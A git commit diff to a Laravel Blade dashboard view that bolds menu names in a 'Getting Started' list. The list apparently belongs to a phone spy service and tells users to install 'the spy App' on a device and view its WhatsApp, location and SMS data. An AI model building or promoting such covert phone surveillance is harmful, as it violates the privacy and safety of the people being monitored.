5670d02dcf671cb822304a62f98ab4b5b8b4b992
DALI HILLARY <dalirichardh@gmail.com>
2021-07-18 18:42:35 +0300

    more details

--- resources/views/livewire/client/dashboard.blade.php
+++ resources/views/livewire/client/dashboard.blade.php
@@ -9,9 +9,9 @@
         <hr><hr>
         <h4 style="text-align: center;">*******GETTING STARTED********</h4>
         <ol style="text-align: left;">
-            <li>Go to <em>New Token</em> to Generate a Token to use on device</li>
-            <li>Go to <em>Mobile Client</em> to Download the spy App to use on the device</li>
-            <li>When All is set Up, to view Phone data, Select the device from <em>Select Phone</em> in the Side Bar</li>
+            <li>Go to <b><em>New Token</em></b> to Generate a Token to use on device</li>
+            <li>Go to <b><em>Mobile Client</em></b> to Download the spy App to use on the device</li>
+            <li>When All is set Up, to view Phone data, Select the device from <b><em>--Select Phone--</em></b> in the Side Bar</li>
             <li>Then go through the various options like Whatsapp, Location, Sms, etc</li>
         </ol>
     </div>
